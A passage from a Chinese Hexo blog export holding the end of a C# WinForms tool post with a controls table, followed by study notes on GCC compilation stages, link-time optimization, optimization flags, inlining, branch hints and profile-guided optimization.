class="subst">&#123;imgPath&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">        <span class="comment">// 可以选择是否退出或继续处理</span></span><br><span class="line">        <span class="comment">// exit();  // 如果需要退出的话</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将内容合并</span></span><br><span class="line"><span class="built_in">string</span> finalContent = frontMatter.ToString() + Environment.NewLine + fileContent;</span><br><span class="line"><span class="comment">// 写入文件</span></span><br><span class="line"><span class="comment">//File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8);</span></span><br><span class="line"><span class="keyword">await</span> Task.Run(() =&gt; File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8));</span><br><span class="line">AppendMessage(<span class="string">$&quot;[+] successfully processed <span class="subst">&#123;filePath&#125;</span> to <span class="subst">&#123;targetMarkdownFilePath&#125;</span>&quot;</span>, Color.Green);</span><br></pre></td></tr></table></figure></div>
<p>这样以后，基本功能就差不多实现了，这里只对redefine这个主题进行了适配，别的Hexo主题可能需要调整细节。更多的设置功能也可以后续慢慢的添加进去。</p>
<h4 id="常用控件">常用控件</h4>
<table>
<colgroup>
<col style="width: 13%" />
<col style="width: 43%" />
<col style="width: 43%" />
</colgroup>
<thead>
<tr>
<th>控件</th>
<th>常用属性</th>
<th>常用方法</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Label</strong></td>
<td>- <code>Text</code>：显示的文本 <br />-
<code>TextAlign</code>：文本对齐方式 <br />- <code>Font</code>：字体
<br />- <code>ForeColor</code>：文本颜色 <br />-
<code>BackColor</code>：背景颜色 <br />-
<code>AutoSize</code>：是否自动调整大小</td>
<td>- <code>SetBounds</code>：设置控件的位置和大小 <br />-
<code>Focus</code>：设置焦点</td>
</tr>
<tr>
<td><strong>Button</strong></td>
<td>- <code>Text</code>：按钮文本 <br />-
<code>BackColor</code>：按钮背景色 <br />-
<code>ForeColor</code>：按钮文字颜色 <br />-
<code>Enabled</code>：是否启用按钮 <br />- <code>Size</code>：按钮大小
<br />- <code>Tag</code>：关联的控件</td>
<td>- <code>PerformClick()</code>：模拟点击按钮 <br />-
<code>Click</code>：按钮点击事件</td>
</tr>
<tr>
<td><strong>TextBox</strong></td>
<td>- <code>Text</code>：输入文本 <br />-
<code>TextAlign</code>：文本对齐方式 <br />-
<code>Multiline</code>：是否多行文本框<br /> -
<code>MaxLength</code>：最大字符长度 <br />-
<code>PasswordChar</code>：密码字符</td>
<td>- <code>Clear()</code>：清除文本 <br />-
<code>Focus()</code>：设置焦点 <br />-
<code>SelectAll()</code>：全选文本 <br />-
<code>Paste()</code>：粘贴</td>
</tr>
<tr>
<td><strong>ComboBox</strong></td>
<td>- <code>Items</code>：项集合 <br />-
<code>SelectedItem</code>：选中的项 <br />-
<code>SelectedIndex</code>：选中的索引<br /> -
<code>DropDownStyle</code>：下拉框风格（如
<code>DropDownList</code>）</td>
<td>- <code>Add()</code>：添加项 <br />- <code>Remove()</code>：移除项
<br />- <code>SelectedIndexChanged</code>：选项变化事件</td>
</tr>
<tr>
<td><strong>ListBox</strong></td>
<td>- <code>Items</code>：项集合 <br />-
<code>SelectedItem</code>：选中的项 <br />-
<code>SelectedIndex</code>：选中的索引 <br />-
<code>MultiColumn</code>：是否多列显示</td>
<td>- <code>Add()</code>：添加项<br /> -
<code>Remove()</code>：移除项<br /> - <code>Clear()</code>：清空项<br />
- <code>SelectedIndexChanged</code>：选项变化事件</td>
</tr>
<tr>
<td><strong>CheckBox</strong></td>
<td>- <code>Checked</code>：是否选中 <br />- <code>Text</code>：文本
<br />- <code>AutoSize</code>：是否自动调整大小 <br />-
<code>CheckState</code>：勾选状态（<code>Checked</code>、<code>Unchecked</code>）</td>
<td>- <code>PerformClick()</code>：模拟点击 <br />-
<code>CheckedChanged</code>：选中状态变化事件</td>
</tr>
<tr>
<td><strong>RadioButton</strong></td>
<td>- <code>Checked</code>：是否选中 <br />- <code>Text</code>：文本
<br />- <code>GroupName</code>：分组名称，防止多个单选框互相独立</td>
<td>- <code>CheckedChanged</code>：选中状态变化事件<br />-
<code>PerformClick()</code>：模拟点击</td>
</tr>
<tr>
<td><strong>Panel</strong></td>
<td>- <code>BackColor</code>：背景色 <br />-
<code>Dock</code>：停靠方式（如 <code>DockStyle.Fill</code>）<br />-
<code>Padding</code>：控件的内边距</td>
<td>- <code>Controls.Add()</code>：向面板添加控件 <br />-
<code>Controls.Remove()</code>：移除控件</td>
</tr>
<tr>
<td><strong>PictureBox</strong></td>
<td>- <code>Image</code>：显示的图片 <br />-
<code>SizeMode</code>：图片显示方式（如
<code>StretchImage</code>、<code>Zoom</code>） <br />-
<code>BackColor</code>：背景颜色</td>
<td>- <code>Load()</code>：加载图片 <br />-
<code>Refresh()</code>：重绘图片</td>
</tr>
<tr>
<td><strong>RichTextBox</strong></td>
<td>- <code>Text</code>：文本内容 <br />- <code>Font</code>：字体
<br />- <code>SelectionStart</code>：选中文本的起始位置<br />-
<code>SelectionLength</code>：选中文本的长度</td>
<td>- <code>AppendText()</code>：追加文本 <br />-
<code>Clear()</code>：清空文本 <br />-
<code>Find()</code>：查找文本</td>
</tr>
<tr>
<td><strong>DateTimePicker</strong></td>
<td>- <code>Value</code>：选定的日期时间 <br />-
<code>Format</code>：日期时间格式 <br />- <code>MinDate</code>：最小日期
<br />- <code>MaxDate</code>：最大日期</td>
<td>- <code>CloseUp()</code>：关闭下拉日历 <br />-
<code>DropDown()</code>：展开下拉日历</td>
</tr>
<tr>
<td><strong>TrackBar</strong></td>
<td>- <code>Minimum</code>：最小值 <br />- <code>Maximum</code>：最大值
<br />- <code>Value</code>：当前值 <br />-
<code>TickFrequency</code>：刻度频率</td>
<td>- <code>ValueChanged</code>：值变化事件</td>
</tr>
<tr>
<td><strong>TabControl</strong></td>
<td>- <code>TabPages</code>：Tab页集合 <br />-
<code>SelectedTab</code>：当前选中的Tab页 <br />-
<code>Alignment</code>：Tab的对齐方式</td>
<td>- <code>SelectTab()</code>：切换选中的Tab</td>
</tr>
<tr>
<td><strong>ToolTip</strong></td>
<td>- <code>ToolTipTitle</code>：工具提示标题 <br />-
<code>IsBalloon</code>：是否气泡提示 <br />-
<code>InitialDelay</code>：首次显示延迟</td>
<td>- <code>SetToolTip()</code>：为控件设置工具提示</td>
</tr>
<tr>
<td><strong>TreeView</strong></td>
<td>- <code>Nodes</code>：树节点集合 <br />-
<code>SelectedNode</code>：选中的节点 <br />-
<code>CheckBoxes</code>：是否启用复选框</td>
<td>- <code>ExpandAll()</code>：展开所有节点 <br />-
<code>CollapseAll()</code>：折叠所有节点</td>
</tr>
<tr>
<td><strong>DateTimePicker</strong></td>
<td>- <code>Value</code>：当前选中的日期时间 <br />-
<code>Format</code>：日期时间显示格式</td>
<td>- <code>CloseUp()</code>：关闭日历窗口 <br />-
<code>DropDown()</code>：打开日历窗口</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>Development</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>Development</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Algorithmica-HPC研读记录2</title>
    <url>/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/</url>
    <content><![CDATA[<h2 id="algorithmica-hpc研读记录4-6章">Algorithmica
HPC研读记录（4-6章）</h2>
<h3 id="四编译compilation">四、编译（Compilation）</h3>
<h4 id="概述">概述</h4>
<p>学习汇编语言的主要好处并不在于能够用它编写程序，而是在于理解编译后的代码在执行过程中发生了什么，以及它对性能的影响。</p>
<p>在极少数情况下，我们确实需要手写汇编代码以达到最高性能，但大多数时候，编译器本身就能生成接近最优的代码。如果编译器未能做到这一点，通常是因为程序员比编译器掌握了更多关于问题的特定知识，但却未能通过源代码有效地传达这些信息。</p>
<p>在本章中，我们将讨论如何让编译器精确地按照我们的意图生成代码，并探讨如何收集有助于进一步优化的有用信息。</p>
<h4 id="编译阶段">编译阶段</h4>
<p>在直接讨论编译器优化之前，让我们先简要回顾一下“整体流程”。将 C
代码转换为可执行文件的过程大致可分为四个阶段：</p>
<ol type="1">
<li><p><strong>预处理（Preprocessing）</strong>
预处理阶段会展开宏（macros）、从头文件中引入源代码，并去除源代码中的注释。可以使用以下命令查看预处理后的代码：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -E source.c</span><br></pre></td></tr></table></figure></div>
<p>这会将预处理后的源代码输出到标准输出（stdout）。</p></li>
<li><p><strong>编译（Compiling）</strong>
编译器会解析源代码，检查语法错误，并将代码转换为中间表示（Intermediate
Representation，IR）。在此过程中，它还会进行一些优化，并最终将 IR
翻译成汇编代码。可以使用以下命令生成汇编文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -S file.c</span><br></pre></td></tr></table></figure></div>
<p>这将产生一个扩展名为 <code>.s</code> 的汇编代码文件。</p></li>
<li><p><strong>汇编（Assembly）</strong>
这一阶段会将汇编代码转换为机器码（machine
code）。需要注意的是，此时所有外部函数调用（如
<code>printf</code>）仍然是占位符，并未真正解析。可以使用以下命令进行汇编：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -c file.c</span><br></pre></td></tr></table></figure></div>
<p>这会生成一个 <code>.o</code>（目标文件，Object File）。</p></li>
<li><p><strong>链接（Linking）</strong>
最后，链接器会解析所有函数调用，并填充它们的真实地址，从而生成最终的可执行文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o binary file.c</span><br></pre></td></tr></table></figure></div>
<p>这将生成一个可执行的二进制文件 <code>binary</code>。</p></li>
</ol>
<p>在这四个阶段的每一个阶段，都有可能通过不同的方式来优化程序的性能。</p>
<h4 id="编译选项与目标平台">编译选项与目标平台</h4>
<h5 id="过程间优化interprocedural-optimization"><strong>过程间优化（Interprocedural
Optimization）</strong></h5>
<p>我们之所以有<strong>链接（linking）</strong>这个最后阶段，是因为逐个文件进行编译再进行链接，既更容易实现，也更快。这种方式可以<strong>并行</strong>编译多个文件，并<strong>缓存</strong>中间结果，提高编译效率。</p>
<p>此外，它还允许代码以<strong>库（library）</strong>的形式分发，库可以是<strong>静态</strong>的，也可以是<strong>共享</strong>的：</p>
<ul>
<li><strong>静态库（Static Libraries）</strong>
静态库就是一组<strong>预编译的目标文件（object
files）</strong>的集合，编译器会将它们与其他源代码合并，最终生成一个<strong>单一的可执行文件</strong>，就像正常编译时那样。</li>
<li><strong>动态库或共享库（Dynamic/Shared Libraries）</strong>
共享库是<strong>预编译的可执行文件</strong>，其中包含额外的元信息（meta-information），用于标识库中的<strong>可调用函数和数据</strong>。这些引用会在<strong>运行时（runtime）</strong>解析。正如其名称所示，这种方式允许多个程序<strong>共享</strong>已编译的二进制代码。</li>
</ul>
<p>使用<strong>静态库</strong>的主要优势是可以执行<strong>各种过程间优化（interprocedural
optimizations）</strong>，这些优化需要比普通库函数签名更多的上下文信息，例如：</p>
<ul>
<li><strong>函数内联（Function Inlining）</strong></li>
<li><strong>无用代码消除（Dead Code Elimination）</strong></li>
</ul>
<p>要强制<strong>链接器（linker）</strong>仅查找和接受<strong>静态库</strong>，可以使用
<code>-static</code> 选项，例如：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -static -o my_program my_program.c -lmylib</span><br></pre></td></tr></table></figure></div>
<h5 id="链接时优化link-time-optimization-lto"><strong>链接时优化（Link-Time
Optimization, LTO）</strong></h5>
<p>这一过程被称为<strong>链接时优化（LTO）</strong>。现代编译器在目标文件（object
files）中<strong>存储了一种中间表示（intermediate representation,
IR）</strong>，因此可以在整个程序的层面进行<strong>轻量级优化</strong>。</p>
<p>此外，LTO
还允许在<strong>不同的编程语言</strong>之间进行优化——只要它们的编译器使用相同的中间表示，就可以进行跨语言优化。</p>
<p>LTO 是一个<strong>相对较新的特性</strong>（GCC 直到<strong>2014
年左右</strong>才支持），但它仍然<strong>远未完善</strong>。在 C 和 C++
中，为了确保<strong>不会因独立编译（separate
compilation）损失性能</strong>，一种解决方案是<strong>创建仅包含头文件的库（header-only
library）</strong>。</p>
<p><strong>头文件库（Header-Only Library）</strong>的特点：</p>
<ul>
<li>仅由<strong>头文件（<code>.h</code> 或
<code>.hpp</code>）</strong>组成，包含所有函数的完整定义，而不仅仅是声明。</li>
<li>只需<strong>直接包含（<code>#include</code>）</strong>这些头文件，编译器就能访问所有可用的优化。</li>
<li><strong>缺点</strong>是每次编译时<strong>都必须重新编译库的代码</strong>，但它确保了<strong>不会丢失性能</strong>，并且提供了更好的<strong>控制权</strong>。</li>
</ul>
<p><strong>1. 为什么需要 LTO？</strong></p>
<p>通常，我们编译 C/C++
程序时是<strong>逐个文件</strong>进行编译，然后在链接时合并这些编译结果。但这样会有一个问题：<strong>编译器只能在单个源文件内进行优化</strong>，它无法跨文件进行全局优化。例如：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lib.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> {</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, add(<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>在<strong>单文件编译</strong>时，编译 <code>main.c</code> 时无法看到
<code>add()</code>
的具体实现，因此它不会进行<strong>内联优化</strong>，而是必须生成<strong>函数调用</strong>指令。</p>
<p>但是，<strong>LTO
允许编译器在链接阶段看到整个程序的代码</strong>，从而进行：</p>
<ul>
<li><strong>跨文件内联（Cross-File Inlining）</strong></li>
<li><strong>跨文件常量传播（Cross-File Constant
Propagation）</strong></li>
<li><strong>消除未使用的代码（Dead Code Elimination）</strong></li>
</ul>
<p><strong>2. 静态库 vs 共享库</strong></p>
<table>
<colgroup>
<col style="width: 20%">
<col style="width: 40%">
<col style="width: 40%">
</colgroup>
<thead>
<tr>
<th>特性</th>
<th><strong>静态库（Static Library）</strong></th>
<th><strong>共享库（Shared Library）</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>链接方式</td>
<td><strong>编译时</strong>合并到可执行文件中</td>
<td><strong>运行时</strong>动态加载</td>
</tr>
<tr>
<td>可执行文件大小</td>
<td><strong>较大</strong>（包含所有库代码）</td>
<td><strong>较小</strong>（只包含引用）</td>
</tr>
<tr>
<td>运行时性能</td>
<td><strong>更快</strong>（所有代码已加载）</td>
<td><strong>略慢</strong>（可能需要动态加载）</td>
</tr>
<tr>
<td>更新库的影响</td>
<td><strong>需要重新编译整个程序</strong></td>
<td><strong>直接替换库文件即可生效</strong></td>
</tr>
<tr>
<td>是否支持 LTO</td>
<td><strong>支持（可优化跨文件调用）</strong></td>
<td><strong>不支持（只知道函数签名）</strong></td>
</tr>
</tbody>
</table>
<p>对于<strong>性能敏感的程序</strong>（如游戏引擎、嵌入式系统），通常会选择<strong>静态库
+ LTO</strong>，以最大化优化。
对于<strong>需要动态更新的程序</strong>（如操作系统、应用程序），则更倾向于<strong>共享库</strong>，以减少存储占用并方便维护。</p>
<p><strong>3. 头文件库（Header-Only Library）</strong></p>
<p>头文件库是一种特殊的优化方式，它的<strong>优点</strong>是：</p>
<ul>
<li><strong>所有代码都可见，编译器能进行最大程度的优化</strong>（比如内联和常量折叠）。</li>
<li><strong>避免了 LTO 可能带来的编译器兼容性问题</strong>。</li>
<li><strong>使用方便</strong>，只需 <code>#include</code>
头文件即可，无需额外的编译步骤。</li>
</ul>
<p>但它的<strong>缺点</strong>是：</p>
<ul>
<li><strong>每次编译都要重新编译库的代码</strong>，可能会导致<strong>编译时间变长</strong>。</li>
<li><strong>难以控制 ABI
兼容性</strong>，更新库时可能会影响已编译的代码。</li>
</ul>
<h5 id="优化级别"><strong>优化级别</strong></h5>
<p>GCC 主要提供 <strong>4.5 个主要的优化级别</strong>，用于
<strong>优化程序运行速度</strong>：</p>
<table>
<colgroup>
<col style="width: 21%">
<col style="width: 78%">
</colgroup>
<thead>
<tr>
<th><strong>优化级别</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-O0</code>（默认）</td>
<td><strong>不进行优化</strong>（但实际上优化了
<strong>编译时间</strong>）。</td>
</tr>
<tr>
<td><code>-O1</code>（或 <code>-O</code>）</td>
<td><strong>启用一些简单优化</strong>，几乎
<strong>不影响编译时间</strong>，但能提升性能。</td>
</tr>
<tr>
<td><code>-O2</code></td>
<td><strong>启用所有已知的、不会引入负面影响的优化</strong>，且优化时间较合理（<strong>生产环境常用</strong>）。</td>
</tr>
<tr>
<td><code>-O3</code></td>
<td><strong>启用几乎所有正确的优化</strong>，但编译时间可能更长，某些优化可能不适用于所有场景。</td>
</tr>
<tr>
<td><code>-Ofast</code></td>
<td><strong>包含 <code>-O3</code> 的所有优化</strong>，再加上一些
<strong>可能违反标准但大多数情况下无害的优化</strong>（如
<strong>浮点运算重排</strong>，可能导致
<strong>少量精度丢失</strong>）。</td>
</tr>
</tbody>
</table>
<p>此外，GCC 还有 <strong>许多其他优化选项</strong>，但它们
<strong>过于特殊</strong>，默认情况下不会启用，甚至在某些情况下会
<strong>降低性能</strong>。在接下来的章节，我们会讨论其中的一些高级优化选项。</p>
<p><strong>指定目标架构（Specifying Targets）</strong></p>
<p>接下来，我们希望告诉编译器更多关于代码将在哪些计算机上运行的信息。<strong>支持的平台范围越小，优化效果越好</strong>。默认情况下，编译器会生成可以在
<strong>任何 2000 年以后发布的 x86 处理器</strong>
上运行的二进制文件。</p>
<p><strong>最简单的方式</strong> 来缩小适用范围是使用
<code>-march</code> 选项来指定确切的微架构。例如：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">-march=haswell  <span class="comment"># 生成适用于 Haswell 微架构的代码</span></span><br></pre></td></tr></table></figure></div>
<p>如果你是在<strong>同一台将运行程序的计算机上进行编译</strong>，可以使用
<code>-march=native</code> 让编译器<strong>自动检测</strong>本机 CPU
并生成相应的优化代码。</p>
<p>由于<strong>指令集通常是向后兼容的</strong>，因此通常只需要指定<strong>最老的微架构</strong>即可。例如，如果你的目标平台范围包括
<strong>Haswell 及更新的 CPU</strong>，使用 <code>-march=haswell</code>
就可以确保<strong>所有更老的 CPU 仍然可以运行</strong>。</p>
<p>另一种更精细的方式是<strong>直接列出</strong>
你希望使用的<strong>特定指令集</strong>，例如：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">-mavx2  <span class="comment"># 启用 AVX2 指令集</span></span><br><span class="line">-mpopcnt  <span class="comment"># 启用 popcnt（人口计数）指令</span></span><br></pre></td></tr></table></figure></div>
<p>如果你<strong>仅仅想针对某个 CPU 进行优化，但仍希望它可以在其他 CPU
上运行</strong>，可以使用 <code>-mtune</code> 选项，例如：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">-mtune=haswell</span><br></pre></td></tr></table></figure></div>
<p>与 <code>-march</code> 不同，<strong><code>-mtune</code>
只是优化，不会使用不兼容的指令</strong>，所以不会导致程序在不支持的 CPU
上崩溃。 （<strong>注意</strong>：默认情况下，<code>-march=x</code>
也会隐含 <code>-mtune=x</code>，即自动优化目标 CPU。）</p>
<p><strong>除了在编译时传递这些参数，也可以直接在代码中使用
<code>#pragma</code> 指令</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC optimize(<span class="string">"O3"</span>)   <span class="comment">// 仅优化本文件为 O3 级别</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC target(<span class="string">"avx2"</span>)   <span class="comment">// 仅对本文件启用 AVX2 指令</span></span></span><br></pre></td></tr></table></figure></div>
<p>这种方法适用于<strong>仅优化特定的高性能函数</strong>，也就是局部优化，而不影响整个项目的编译时间。</p>
<p>有时候，你可能希望在<strong>同一个库</strong>中<strong>提供多个针对不同
CPU 架构优化的实现</strong>。</p>
<p>我们可以使用<strong>基于 <code>__attribute__</code>
的语法</strong>，让编译器<strong>自动选择</strong>最合适的函数版本：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">__attribute__(( <span class="built_in">target</span>(<span class="string">"default"</span>) )) <span class="comment">// 默认回退实现</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">popcnt</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">    <span class="type">int</span> s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        s += (x &gt;&gt; i &amp; <span class="number">1</span>); <span class="comment">// 逐位统计 1 的个数</span></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">__attribute__(( <span class="built_in">target</span>(<span class="string">"popcnt"</span>) )) <span class="comment">// 仅在 CPU 支持 popcnt 指令时使用</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">popcnt</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> __builtin_popcount(x); <span class="comment">// 内建 popcnt 指令</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>在 Clang 编译器中，<strong>不能</strong>使用 <code>#pragma</code>
直接在代码中设置目标架构和优化选项， 但可以<strong>像 GCC
一样</strong>使用 <code>__attribute__</code>
来实现<strong>多版本函数</strong>。</p>
<h4 id="条件优化">条件优化</h4>
<p>条件优化<strong>不完全符合标准</strong>，而且<strong>对具体场景依赖性很强</strong>，需要程序员提供<strong>额外的信息</strong>来判断是否启用。所以即使开了<strong>O3</strong>优化编译器也不会默认采用这些优化方式。</p>
<h5 id="循环展开">循环展开</h5>
<p>循环展开是一种编译器优化技术，它<strong>减少循环控制的开销</strong>，通过复制循环体的代码来减少循环的迭代次数。这样可以减少
<code>cmp</code>（比较）、<code>jmp</code>（跳转）等指令的执行，提高 CPU
指令流水线的效率。</p>
<p>默认情况下是关闭的，除非：</p>
<ul>
<li><strong>迭代次数是编译时的常数</strong>（例如
<code>for (int i = 0; i &lt; 4; i++)</code>）。</li>
<li>在这种情况下，GCC
可能会<strong>完全去掉循环</strong>，直接替换成一系列不带跳转的指令。</li>
</ul>
<p><strong>如何启用循环展开？</strong></p>
<p><strong>（1）使用编译选项</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">-funroll-loops</span><br></pre></td></tr></table></figure></div>
<ul>
<li>让编译器<strong>尝试展开所有已知迭代次数的循环</strong>（包括编译时可知和运行时进入循环时可知的）。</li>
<li>但这会<strong>增加二进制文件大小</strong>，并不总是提高性能。</li>
</ul>
<p><strong>（2）使用 <code>#pragma</code> 控制单个循环</strong></p>
<p>如果只想<strong>对某个特定循环</strong>展开，可以使用
<code>#pragma</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC unroll 4</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">    <span class="comment">// 代码块</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<ul>
<li>这里 <code>#pragma GCC unroll 4</code> 告诉编译器<strong>展开 4
次迭代</strong>。</li>
<li>适用于 <code>n</code>
<strong>较大且无法静态确定</strong>的情况。</li>
</ul>
<h5 id="内联函数">内联函数</h5>
<p>函数内联是一种优化技术，它<strong>将函数调用替换为函数体本身</strong>，从而减少函数调用的开销（如参数传递、栈操作等）。</p>
<p>在 C/C++ 中，可以使用 <code>inline</code>
关键字<strong>提示</strong>编译器进行内联：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">square</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>编译器可能会忽略
<code>inline</code></strong>，如果它认为内联后不会提高性能或代码膨胀太严重。</li>
<li><strong>适用于短小、频繁调用的函数</strong>（例如 <code>math</code>
函数）。</li>
</ul>
<p>如果一定要让编译器<strong>强制内联</strong>，可以使用
<code>__attribute__((always_inline))</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FORCE_INLINE inline __attribute__((always_inline))</span></span><br><span class="line"></span><br><span class="line"><span class="function">FORCE_INLINE <span class="type">int</span> <span class="title">square</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> x * x;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<ul>
<li>这会<strong>强制编译器内联</strong>，除非编译器优化级别不允许（如
<code>-O0</code>）。</li>
<li>适用于<strong>性能关键代码</strong>（如高频调用的
<code>getter/setter</code>）。</li>
</ul>
<h5 id="分支可能性提示">分支可能性提示</h5>
<p>从 C++20 开始，<strong><code>[[likely]]</code></strong> 和
<strong><code>[[unlikely]]</code></strong>
属性可以用来提示编译器某个分支是否更可能被执行。这对提高分支预测的准确性和优化性能非常有帮助。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">factorial</span><span class="params">(<span class="type">int</span> n)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) [[likely]]   <span class="comment">// 提示编译器这个分支更可能执行</span></span><br><span class="line">        <span class="keyword">return</span> n * <span class="built_in">factorial</span>(n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> [[unlikely]]       <span class="comment">// 提示编译器这个分支不太可能执行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>[[likely]]</code> 表示此分支更有可能发生。</li>
<li><code>[[unlikely]]</code> 表示此分支不太可能发生。</li>
</ul>
<p>这告诉编译器如何生成更高效的代码，尤其是在有多个条件判断时。</p>
<p>在 C++20 之前，<strong>GCC 提供了
<code>__builtin_expect</code></strong>
函数来告诉编译器分支的可能性：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">factorial</span><span class="params">(<span class="type">int</span> n)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(n &gt; <span class="number">1</span>, <span class="number">1</span>))  <span class="comment">// 告诉编译器 n &gt; 1 更可能为真</span></span><br><span class="line">        <span class="keyword">return</span> n * <span class="built_in">factorial</span>(n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p><code>__builtin_expect</code>函数的第二个参数表示“预测值”：</p>
<ul>
<li><code>1</code> 表示该分支“更可能发生”。</li>
<li><code>0</code> 表示该分支“不太可能发生”。</li>
</ul>
<p>这虽然是编译器的内建功能，但并没有像 <code>[[likely]]</code> 和
<code>[[unlikely]]</code> 那样成为 C++
标准的一部分，使用时需要依赖编译器的特定实现。</p>
<h5 id="pgo">PGO</h5>
<p><strong>Profile-Guided Optimization (PGO)</strong>
是一种利用实际运行数据来优化程序性能的技术。通过收集程序在运行时的数据（例如分支的执行频率、函数调用次数、循环迭代次数等），编译器可以做出更有针对性的优化决策，从而超过仅通过静态分析所能实现的优化效果。</p>
<p>PGO 的基本流程包括以下步骤：</p>
<ol type="1">
<li><strong>生成分析数据</strong>：编译程序并在实际数据上运行，通过添加计时器和计数器来收集数据。</li>
<li><strong>使用分析数据优化编译</strong>：使用从第一次运行中收集到的
profiling 数据重新编译程序。</li>
</ol>
<p><strong>步骤 1：生成 Profiling 数据</strong></p>
<p>使用 <code>-fprofile-generate</code> 标志，GCC 会在程序中插入
profiling
代码，生成能够跟踪执行情况的数据文件。假设你在编译源代码时使用如下命令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -fprofile-generate [其他编译选项] source.cc -o binary</span><br></pre></td></tr></table></figure></div>
<p>然后运行该程序，理想情况下使用与真实场景接近的数据输入，这样生成的数据才具有代表性。运行程序后，会生成
